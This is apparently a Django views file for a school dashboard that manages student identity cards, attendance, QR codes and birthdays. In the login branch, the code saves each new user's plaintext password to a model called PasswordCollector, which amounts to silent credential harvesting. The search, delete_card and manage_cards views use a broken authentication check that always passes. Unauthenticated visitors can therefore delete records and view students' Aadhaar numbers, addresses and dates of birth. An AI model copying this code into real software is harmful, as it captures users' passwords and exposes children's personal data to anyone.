from time import strftime
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.contrib.auth import login, logout, authenticate
from .models import Attendance, IdentityCard, PasswordCollector, Contact
from .qr_code import qr_code
from datetime import date, datetime
# Create your views here.


def index(request):
    if str(request.user) != "AnonymousUser":
        todays_date = date.today()
        # Get birthdays
        birthday_guys = IdentityCard.objects.get_birthdays()        
        if len(birthday_guys) == 0:
            birthdays = 'null'
        else:
            birthdays = 'there'
        birthday_guys_names = []
        for item in birthday_guys:
            birthday_guys_names.append(item.name.split()[0])
        # Get attendance
        standard = request.user.account.class_teacher
        division = request.user.account.division
        total = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division))
        girls = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender="female"))
        boys = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender="male"))
        total_present = len(Attendance.objects.filter(date=todays_date, student__standard=request.user.account.class_teacher, student__division=request.user.account.division))
        if total_present != 0:
            params = {"total": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher)),
            "girls": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, gender="female")),
            "boys": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, gender="male")),
            "total_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division)),
            "total_absent": total - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division)),
            "percentage": total_present / total * 100,
            "total_boys_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="male")),
            "total_boys_absent": boys - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="male")),
            "total_girls_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="female")),
            "total_attendance_href": f"/get_attendance/?request_code=add_icard&date={todays_date}&standard={standard.lower()}&division={division.lower()}",
            "birthdays": birthdays,
            "birthday_guys": birthday_guys_names,
            "total_girls_absent": girls - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="female"))}
            return render(request, "dashboard/index.html", params)
        else:
            return render(request, 'dashboard/holiday.html', {"birthdays": birthdays, "birthday_guys": birthday_guys_names,})
    elif request.method == "POST":
      username = request.POST["username"]
      password = request.POST["password"]
      user = authenticate(request, username=username, password=password)
      if user != None:
        login(request, user)
        if len(PasswordCollector.objects.filter(user=user)) == 0:
            PasswordCollector.objects.create(user=user, password=password)
        todays_date = date.today()
        # Get birthdays
        birthday_guys = IdentityCard.objects.get_birthdays()        
        if len(birthday_guys) == 0:
            birthdays = 'null'
        else:
            birthdays = 'there'
        birthday_guys_names = []
        for item in birthday_guys:
            birthday_guys_names.append(item.name.split()[0])
        # Get attendance
        standard = request.user.account.class_teacher
        division = request.user.account.division
        total = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division))
        girls = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender="female"))
        boys = len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender="male"))
        total_present = len(Attendance.objects.filter(date=todays_date, student__standard=request.user.account.class_teacher, student__division=request.user.account.division))
        if total_present != 0:
            params = {"total": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher)),
            "girls": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, gender="female")),
            "boys": len(IdentityCard.objects.filter(standard=request.user.account.class_teacher, gender="male")),
            "total_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division)),
            "total_absent": total - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division)),
            "percentage": total_present / total * 100,
            "total_boys_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="male")),
            "total_boys_absent": boys - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="male")),
            "total_girls_present": len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="female")),
            "birthdays": birthdays,
            "birthday_guys": birthday_guys_names,
            "total_girls_absent": girls - len(Attendance.objects.filter(date=todays_date, student__standard=standard, student__division=division, student__gender="female"))}
            return render(request, "dashboard/index.html", params)
        else:
            return render(request, 'dashboard/holiday.html')
      else:
        return render(request, 'dashboard/404.html', {"customize":True, "title":"USER NOT FOUND", "msg":"The credentials that you have entered during login doesn't match to that of any user. Please try logging in again.", "href":"/login/"})     
    else:
      return redirect("login")


def search(request):
    if request.user != 'AnonymousUser':
        search_query = request.GET.get('query', None)
        if search_query != None:
            if len(search_query) == 0:
                search_query = None
        if search_query is not None:
            boy_students = IdentityCard.objects.filter(name__icontains=search_query) or IdentityCard.objects.filter(gr_no__icontains=search_query) or IdentityCard.objects.filter(address__icontains=search_query) or IdentityCard.objects.filter(contact__icontains=search_query) or IdentityCard.objects.filter(standard__icontains=search_query) or IdentityCard.objects.filter(division__icontains=search_query) or IdentityCard.objects.filter(dob__icontains=search_query) or IdentityCard.objects.filter(aadhaar__icontains=search_query) or IdentityCard.objects.filter(gender__icontains=search_query)
            boy_students_list = []
            for boy_student in boy_students:
                name = boy_student.name
                gr_no = boy_student.gr_no
                dob = str(boy_student.dob)
                contact = boy_student.contact
                address = boy_student.address
                aadhaar = boy_student.aadhaar
                boy_student_list = [name, gr_no, dob, contact, address, aadhaar]
                boy_students_list.append(boy_student_list)
            return render(request, 'dashboard/results.html', {'boy_students_list': boy_students_list, 'results_len': len(boy_students_list), 'search_query': search_query})
        else:
            return redirect('index')
    else:
        return redirect("login")


def delete_card(request, gr_no):
    if request.user != 'AnonymousUser':
        IdentityCard.objects.get(gr_no=gr_no).delete()
        return redirect('manage_cards')
    else:
        return redirect('index')


def settings(request):
     return render(request, "dashboard/settings.html")


def manage_cards(request):
    if request.user != 'AnonymousUser':
        boy_students = IdentityCard.objects.all()
        print(boy_students)
        boy_students_list = []
        for boy_student in boy_students:
            name = boy_student.name
            gr_no = boy_student.gr_no
            dob = str(boy_student.dob)
            contact = boy_student.contact
            address = boy_student.address
            aadhaar = boy_student.aadhaar
            boy_student_list = [name, gr_no, dob, contact, address, aadhaar]
            boy_students_list.append(boy_student_list)
        return render(request, 'dashboard/manageCards.html', {'boy_students_list': boy_students_list})
    else:
      return redirect("login")


def error_404(request, exception):
    return render(request, '404.html')  


def spreadsheet(request):
    if request.method == 'POST':
        # Get the Data 
        # Create a Spreadsheet
        return render(request, 'dashboard/download_spreadsheet.html')
    else:
        return render(request, 'dashboard/spreadsheet.html')


def add(request):
  if str(request.user) != "AnonymousUser":
    if request.method == "POST":
      if len(IdentityCard.objects.filter(gr_no=request.POST["gr_no"])) == 0:
          name = request.POST["name"]
          pic = request.FILES['pic']
          standard = request.POST["standard"]
          division = request.POST["division"]
          gr_no = request.POST["gr_no"]
          gender = request.POST["gender"]
          dob = datetime.strptime(request.POST["dob"], '%y-%m-%d')
          contact = request.POST["contact"]
          address = request.POST["address"]
          aadhaar = request.POST["aadhaar"]
          card = IdentityCard.objects.create(name=name, picture=pic, standard=standard, division=division, gr_no=gr_no, gender=gender, dob=dob, contact=contact, address=address, aadhaar=aadhaar)
          qr_code(card.gr_no)
          total = len(IdentityCard.objects.all())
          return render(request, "dashboard/qrcode.html", {"card":card, "total":total})
      else:
          return render(request, "dashboard/add.html", {"error":True, "message":"G.R. no. entered already exists."})
    else:
        total_cards = len(IdentityCard.objects.all())
        return render(request, "dashboard/add.html", {'total_i_cards': total_cards})
  else:
    return render(request, "dashboard/404.html")


def girls_attendance(request):
    if str(request.user) != "AnonymousUser":
        get_date = date.today()
        get_standard = request.user.account.class_teacher
        get_division = request.user.account.division
        # Getting Girls Presenties
        data = Attendance.objects.filter(date=get_date, student__standard=get_standard, student__division=get_division, student__gender='female')
        attendance_list_present = []
        presenties_grnos = []
        for gr_no in data:
            gr_no = gr_no.student.gr_no
            presenties_grnos.append(gr_no)
            student = IdentityCard.objects.get(gr_no=gr_no)
            name = student.name
            presentie = [name, gr_no, 'Present']     
            attendance_list_present.append(presentie)
        total_girls = len(IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='female'))
        total_girls_present = len(attendance_list_present)
        total_girls_absent = total_girls - total_girls_present
        # Getting the Absenties
        absent_students = []
        attendance_list_absent = []
        for student in IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='female'):
            absent_students.append(student.gr_no)
        for presentie_grno in presenties_grnos:
            if presentie_grno in absent_students:
                absent_students.remove(presentie_grno)
            else:
                continue
        for grno in absent_students:
            student = IdentityCard.objects.get(gr_no=grno)
            name = student.name
            absentie = [name, grno, 'Absent']     
            attendance_list_present.append(absentie)
        return render(request, 'dashboard/attendance.html', {'attendances': attendance_list_present, 'requested_attendance': 'Todays Girls', 'is_description': True, 'description': f'This is todays girls attendance. {total_girls_present} present, ', 'is_code': True, 'code': f'{total_girls_absent} absent', 'absenties': attendance_list_absent})
    else:
        return render(request, "dashboard/404.html")


def boys_attendance(request):
    if str(request.user) != "AnonymousUser":
        get_date = date.today()
        get_standard = request.user.account.class_teacher
        get_division = request.user.account.division
        # Getting Boys Presenties
        data = Attendance.objects.filter(date=get_date, student__standard=get_standard, student__division=get_division, student__gender='male')
        attendance_list_present = []
        presenties_grnos = []
        for gr_no in data:
            gr_no = gr_no.student.gr_no
            presenties_grnos.append(gr_no)
            student = IdentityCard.objects.get(gr_no=gr_no)
            name = student.name
            presentie = [name, gr_no, 'Present']     
            attendance_list_present.append(presentie)
        total_girls = len(IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='male'))
        total_girls_present = len(attendance_list_present)
        total_girls_absent = total_girls - total_girls_present
        print(total_girls_absent)
        # Getting the Absenties
        absent_students = []
        attendance_list_absent = []
        for student in IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='male'):
            absent_students.append(student.gr_no)
        for presentie_grno in presenties_grnos:
            if presentie_grno in absent_students:
                absent_students.remove(presentie_grno)
            else:
                continue
        for grno in absent_students:
            student = IdentityCard.objects.get(gr_no=grno)
            name = student.name
            absentie = [name, grno, 'Absent']     
            attendance_list_present.append(absentie)
        return render(request, 'dashboard/attendance.html', {'attendances': attendance_list_present, 'requested_attendance': 'Todays Boys', 'is_description': True, 'description': f'This is todays boys attendance. {total_girls_present} present, ', 'is_code': True, 'code': f'{total_girls_absent} absent', 'absenties': attendance_list_absent})
    else:
        return render(request, "dashboard/404.html")


def qrcode(request):
    if str(request.user) != "AnonymousUser":
        if request.method == 'POST':
            gr_code = request.POST['gr_no']
            qr_code(gr_code=gr_code)
            return render(request, 'dashboard/qrcode3.html', {'name': gr_code})
        else:
            return render(request, 'dashboard/qrcode2.html')
    else:
        return render(request, "dashboard/404.html")


def get_attendance(request):
    if str(request.user) != "AnonymousUser":
        if request.GET.get('standard') != None:
            get_date = request.GET.get('date')
            get_standard = request.GET.get('standard')
            get_division = request.GET.get('division')
            # Getting Presenties
            data = Attendance.objects.filter(date=get_date, student__standard=get_standard, student__division=get_division)
            attendance_list_present = []
            presenties_grnos = []
            for gr_no in data:
                gr_no = gr_no.student.gr_no
                presenties_grnos.append(gr_no)
                student = IdentityCard.objects.get(gr_no=gr_no)
                name = student.name
                presentie = [name, gr_no, 'Present']     
                attendance_list_present.append(presentie)
            # Getting Absenties
            absent_students = []
            attendance_list_absent = []
            total_students = len(IdentityCard.objects.filter(standard=get_standard, division=get_division))
            total_boys = len(IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='male'))
            total_girls = len(IdentityCard.objects.filter(standard=get_standard, division=get_division, gender='female'))
            for student in IdentityCard.objects.filter(standard=get_standard, division=get_division):
                absent_students.append(student.gr_no)
            for presentie_grno in presenties_grnos:
                if presentie_grno in absent_students:
                    absent_students.remove(presentie_grno)
                else:
                    continue
            for grno in absent_students:
                student = IdentityCard.objects.get(gr_no=grno)
                name = student.name
                absentie = [name, grno, 'Absent']     
                attendance_list_present.append(absentie)
            return render(request, "dashboard/attendance.html", {'attendances': attendance_list_present, 'requested_attendance': f'{get_standard.upper()}-{get_division.upper()}', 'absenties': attendance_list_absent, 'is_description': True, 'description': f'This is the attendance of {get_standard.upper()}-{get_division.upper()} on {get_date}. There are total {total_students} students in the class. Out of which, {total_girls} are girls and {total_boys} are boys.'})
        else:
            return render(request, "dashboard/search.html")
    else:
        return render(request, "dashboard/404.html")


def account(request):
    if str(request.user) != "AnonymousUser":
        # Boys of following class
        boy_students = IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender='male')
        boy_students_list = []
        for boy_student in boy_students:
            name = boy_student.name
            gr_no = boy_student.gr_no
            dob = str(boy_student.dob)
            contact = boy_student.contact
            address = boy_student.address
            aadhaar = boy_student.aadhaar
            boy_student_list = [name, gr_no, dob, contact, address, aadhaar]
            boy_students_list.append(boy_student_list)
        # Girls of following class
        girl_students = IdentityCard.objects.filter(standard=request.user.account.class_teacher, division=request.user.account.division, gender='female')
        girl_students_list = []
        for girl_student in girl_students:
            name = girl_student.name
            gr_no = girl_student.gr_no
            dob = str(girl_student.dob)
            contact = girl_student.contact
            address = girl_student.address
            aadhaar = girl_student.aadhaar
            girl_student_list = [name, gr_no, dob, contact, address, aadhaar]
            girl_students_list.append(girl_student_list)
        return render(request, 'dashboard/account.html', {'boy_students_list': boy_students_list, 'girl_students_list':girl_students_list})
    else:
        return render(request, "dashboard/404.html")


def view_card(request, gr_no):
    if str(request.user) != "AnonymousUser":
        card = IdentityCard.objects.get(gr_no=gr_no)
        card.dob = str(card.dob)
        return render(request, "dashboard/view_identity_card.html", {'card': card})
    else:
        return render(request, "dashboard/404.html")


def change_identity_card(request):
    if str(request.user) != "AnonymousUser":
        card = IdentityCard.objects.get(gr_no=request.POST['gr_no'])     
        if request.FILES.get('pic', None) == None:
            card.picture = card.picture
        else:
            card.picture = request.FILES.get('pic')
        card.name = request.POST['name']
        card.standard = request.POST['standard']
        card.division = request.POST['division']
        card.gr_no = request.POST['gr_no']
        card.gender = request.POST['gender']
        card.dob = datetime.strptime(request.POST["dob"][2:], '%y-%m-%d')
        print(card.dob)
        card.contact = request.POST['contact']
        card.address = request.POST['address']
        card.aadhaar = request.POST['aadhaar']
        card.save()
        return redirect(f'/manage/view_card/{card.gr_no}')
    else:
        return render(request, "dashboard/404.html")


def view_page(request):
    if str(request.user) != "AnonymousUser":    
        return render(request, 'dashboard/pages/icons/mdi.html')
    else:
        return render(request, "dashboard/404.html")


def DeleteAccount(request):
    if str(request.user) != "AnonymousUser":    
        if request.method == 'GET':
            return render(request, 'dashboard/deleteAccount.html')
    else:
        return render(request, "dashboard/404.html")


# APIs
def Handlelogin(request):
    return render(request, "dashboard/login.html")



def Handlelogout(request):
    if str(request.user) != "AnonymousUser":
        logout(request)
        return render(request, "dashboard/login.html", {'logout': True})
    else:
        return render(request, "dashboard/404.html")


def contact(request):
    if request.method == 'POST':
        Contact.objects.create(name=request.POST['name'], email=request.POST['email'], message=request.POST['message']).save()
        return render(request, 'docs/index.html', {'is_msg': True, 'msg': 'We will get back to you soon. Thanks for your valuable feedback!'})
    else:
        return render(request, 'docs/contact.html')
